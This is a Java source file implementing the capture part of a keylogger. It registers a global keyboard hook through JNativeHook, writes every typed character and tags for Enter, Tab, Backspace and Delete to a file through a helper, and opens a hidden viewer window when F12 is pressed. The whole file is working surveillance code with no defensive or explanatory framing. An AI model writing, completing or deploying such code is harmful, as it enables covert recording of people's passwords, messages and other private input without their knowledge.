//File end.
package main;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import Util.FileUtil;
import View.ViewMain;
 
 
public class InterceptKeyboard implements NativeKeyListener{
	
	private StringBuilder str = new StringBuilder();
 
    @Override
    public void nativeKeyPressed(NativeKeyEvent a) {
    	if(a.getKeyCode() == NativeKeyEvent.VC_SPACE){
    		FileUtil.escreverTexto(" ");
    	}
    	if(a.getKeyCode() == NativeKeyEvent.VC_BACKSPACE){
    		FileUtil.escreverTexto("<ap>");         
    	}
    	if(a.getKeyCode() == NativeKeyEvent.VC_DELETE){
    		FileUtil.escreverTexto("<dl>");
    	}
    	if(a.getKeyCode() == NativeKeyEvent.VC_ENTER){
    		FileUtil.escreverTexto("<en>");
    	}
    	if(a.getKeyCode() == NativeKeyEvent.VC_TAB){
    		FileUtil.escreverTexto("<tb>");
    	}
    	if(a.getKeyCode() == NativeKeyEvent.VC_F12){
    		ViewMain vm = new ViewMain();
    		vm.setVisible(true);
    	}
    }
 
    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0) {                     
         }
 
    @Override
    public void nativeKeyTyped(NativeKeyEvent arg0) {
    	if (Character.isWhitespace(arg0.getKeyChar())){                    
    		FileUtil.escreverTexto(str.toString());
            str.delete(0, str.length());
   
    	}
    	else{
	    	str.append(arg0.getKeyChar());
	        FileUtil.escreverTexto(str.toString());
	        str.delete(0, str.length());
    		}
    	}
 
}
